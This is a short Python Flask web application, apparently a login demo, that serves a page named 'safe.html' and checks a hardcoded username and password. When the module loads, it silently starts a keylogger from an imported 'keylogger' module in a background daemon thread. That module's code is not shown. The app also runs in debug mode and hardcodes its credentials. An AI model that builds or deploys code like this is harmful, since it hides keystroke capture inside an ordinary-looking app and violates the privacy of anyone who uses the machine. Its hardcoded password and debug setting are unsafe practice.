from flask import Flask, render_template, request, jsonify
import threading
import keylogger

app = Flask(__name__)

# Start the keylogger in a separate thread
keylogger_thread = threading.Thread(target=keylogger.start_keylogger, daemon=True)
keylogger_thread.start()

@app.route("/")
def index():
    return render_template("safe.html")

@app.route("/login", methods=["POST"])
def login():
    data = request.get_json()
    username = data.get("username")
    password = data.get("password")
    
    # Example authentication logic
    if username == "user" and password == "password":
        return jsonify({"success": True, "message": "Login successful!"})
    else:
        return jsonify({"success": False, "message": "Invalid username or password."})

if __name__ == "__main__":
    app.run(debug=True)